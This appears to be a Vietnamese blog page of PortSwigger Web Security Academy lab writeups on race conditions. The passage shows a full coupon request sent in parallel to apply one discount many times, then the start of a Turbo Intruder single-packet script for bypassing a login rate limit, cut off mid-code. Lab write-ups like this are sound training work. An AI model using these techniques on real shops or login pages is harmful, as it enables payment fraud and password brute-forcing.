@@ -1,0 +1,1772 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="My PortSwigger Web Security Academy writeups">
+      
+      
+        <meta name="author" content="Thanh Dat Hoang">
+      
+      
+        <link rel="canonical" href="https://hoangdat2407.github.io/myblog/Portswigger/Race%20condition/">
+      
+      
+        <link rel="prev" href="../Prototype%20polution/">
+      
+      
+        <link rel="next" href="../Server%20side%20template%20injection/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>Race Condition - PortSwigger Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#race-condition" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="PortSwigger Writeups" class="md-header__button md-logo" aria-label="PortSwigger Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            PortSwigger Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Race Condition
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="PortSwigger Writeups" class="md-nav__button md-logo" aria-label="PortSwigger Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    PortSwigger Writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Server-side
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Server-side
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Access%20control%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Access Control
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Authentication%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authentication
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Business%20logic%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Business Logic
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../File%20upload%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Upload
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../GraphQL/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    GraphQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Information%20disclosure/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Information Disclosure
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20deserialize/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Insecure Deserialization
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../JWT%20attack/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    JWT Attack
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NoSQL%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NoSQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Oauth/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OAuth
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OS%20command%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OS Command Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Path%20traversal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Path Traversal
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Prototype%20polution/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Prototype Pollution
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Race Condition
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Server%20side%20template%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSTI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web%20cache%20poisoning/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Cache Poisoning
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web%20socket/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WebSocket
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XML%20external%20entity%20%28XXE%29%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XXE Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Client-side
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Client-side
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Clickjacking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Clickjacking
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CORS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CORS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CSRF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../DOM-based%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DOM-based Vulnerabilities
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="race-condition">Race condition<a class="headerlink" href="#race-condition" title="Permanent link">&para;</a></h1>
+<h1 id="lab-limit-overrun-race-conditions"><strong>Lab: Limit overrun race conditions</strong><a class="headerlink" href="#lab-limit-overrun-race-conditions" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun">Lab: Limit overrun race conditions | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện thêm sản phẩm <code>Lightweight "l33t" Leather Jacket</code> vào giỏ hàng.</p>
+<p><img alt="image.png" src="image.png" /></p>
+</li>
+<li>
+<p>Điều hướng đến chức năng <code>Giỏ hàng &gt; Apply coupon</code> . Áp mã giảm giá. Tuy nhiên thì ở đây, mã giảm giá không được dùng lại nhiều lần</p>
+<p><img alt="image.png" src="image%201.png" /></p>
+</li>
+<li>
+<p>Tuy nhiên, nếu thực hiện gửi song song nhiều request áp mã giảm giá 1 lần thì liệu server có kịp kiểm tra mã giảm giá đó đã dùng hay chưa? Thực hiện gửi song song nhiều request tới API <code>POST /cart/coupon</code></p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">cart</span><span class="o">/</span><span class="nx">coupon</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">af6001203e4938980e930d7002e00f0</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">wE042yyQRtgA8cJhjvnQ6jYhV0QRrQlZ</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">*</span><span class="err">/*;q=0.8</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">52</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0af6001203e4938980e930d7002e00f0.web-security-academy.net</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0af6001203e4938980e930d7002e00f0.web-security-academy.net/cart</span>
+<span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">navigate</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">User</span><span class="o">:</span><span class="w"> </span><span class="o">?</span><span class="mf">1</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="nx">csrf</span><span class="o">=</span><span class="nx">eQdygsPLhKpDFyVaatbWADwKFkWChzjp</span><span class="o">&amp;</span><span class="nx">coupon</span><span class="o">=</span><span class="nx">PROMO20</span>
+</code></pre></div>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%202.png" /></p>
+</li>
+<li>
+<p>Kết quả có 1 số request áp mã thành công</p>
+<p><img alt="image.png" src="image%203.png" /></p>
+<p><img alt="image.png" src="image%204.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Quay lại chức năng giỏ hàng, quan sát thấy số tiền đã được giảm đi rất nhiều</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%205.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện thanh toán, hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%206.png" /></p>
+</li>
+</ul>
+<h1 id="lab-bypassing-rate-limits-via-race-conditions"><strong>Lab: Bypassing rate limits via race conditions</strong><a class="headerlink" href="#lab-bypassing-rate-limits-via-race-conditions" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits">Lab: Bypassing rate limits via race conditions | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện điều hướng đến chức năng <code>Login</code></p>
+<p><img alt="image.png" src="image%207.png" /></p>
+</li>
+<li>
+<p>Thực hiện login với password sai, sau một số lần, nhận thấy phải đợi 120s sau mới login được tiếp</p>
+<p><img alt="image.png" src="image%208.png" /></p>
+</li>
+<li>
+<p>Thực hiện gửi toàn bộ request vào trong một packer rồi gửi đi → có thể phía backend sẽ không kiểm tra được</p>
+</li>
+<li>
+<p>Thực hiện sử dụng Turbo Intruder như sau:</p>
+<ul>
+<li>
+<p>Config</p>
+<p><img alt="image.png" src="image%209.png" /></p>
+</li>
+<li>
+<p>Code</p>
+<div class="highlight"><pre><span></span><code><span class="nx">def</span><span class="w"> </span><span class="nx">queueRequests</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">wordlists</span><span class="p">)</span><span class="o">:</span>
+
+<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">target</span><span class="w"> </span><span class="nx">supports</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span><span class="p">,</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nx">engine</span><span class="o">=</span><span class="nx">Engine</span><span class="p">.</span><span class="nx">BURP2</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">trigger</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">single</span><span class="o">-</span><span class="nx">packet</span><span class="w"> </span><span class="nx">attack</span>
+<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="nx">they</span><span class="w"> </span><span class="nx">only</span><span class="w"> </span><span class="nx">support</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nx">Engine</span><span class="p">.</span><span class="nx">THREADED</span><span class="w"> </span><span class="nx">or</span><span class="w"> </span><span class="nx">Engine</span><span class="p">.</span><span class="nx">BURP</span><span class="w"> </span><span class="nx">instead</span>
+<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">more</span><span class="w"> </span><span class="nx">information</span><span class="p">,</span><span class="w"> </span><span class="nx">check</span><span class="w"> </span><span class="nx">out</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//portswigger.net/research/smashing-the-state-machine</span>
+<span class="w">    </span><span class="nx">engine</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">RequestEngine</span><span class="p">(</span><span class="nx">endpoint</span><span class="o">=</span><span class="nx">target</span><span class="p">.</span><span class="nx">endpoint</span><span class="p">,</span>
+<span class="w">                           </span><span class="nx">concurrentConnections</span><span class="o">=</span><span class="mf">1</span><span class="p">,</span>
+<span class="w">                           </span><span class="nx">engine</span><span class="o">=</span><span class="nx">Engine</span><span class="p">.</span><span class="nx">BURP2</span>
+<span class="w">                           </span><span class="p">)</span>
+
+<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="s1">&#39;gate&#39;</span><span class="w"> </span><span class="nx">argument</span><span class="w"> </span><span class="nx">withholds</span><span class="w"> </span><span class="nx">part</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nx">each</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">until</span><span class="w"> </span><span class="nx">openGate</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">invoked</span>
+<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="nx">you</span><span class="w"> </span><span class="nx">see</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">negative</span><span class="w"> </span><span class="nx">timestamp</span><span class="p">,</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">server</span><span class="w"> </span><span class="nx">responded</span><span class="w"> </span><span class="nx">before</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">was</span><span class="w"> </span><span class="nx">complete</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="nx">word</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nx">wordlists</span><span class="p">.</span><span class="nx">clipboard</span><span class="o">:</span>
+<span class="w">        </span><span class="nx">engine</span><span class="p">.</span><span class="nx">queue</span><span class="p">(</span><span class="nx">target</span><span class="p">.</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">word</span><span class="p">,</span><span class="w"> </span><span class="nx">gate</span><span class="o">=</span><span class="s1">&#39;race1&#39;</span><span class="p">)</span>
+
+<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="nx">once</span><span class="w"> </span><span class="nx">every</span><span class="w"> </span><span class="s1">&#39;race1&#39;</span><span class="w"> </span><span class="nx">tagged</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">has</span><span class="w"> </span><span class="nx">been</span><span class="w"> </span><span class="nx">queued</span>
+<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="nx">invoke</span><span class="w"> </span><span class="nx">engine</span><span class="p">.</span><span class="nx">openGate</span><span class="p">()</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">send</span><span class="w"> </span><span class="nx">them</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nx">sync</span>
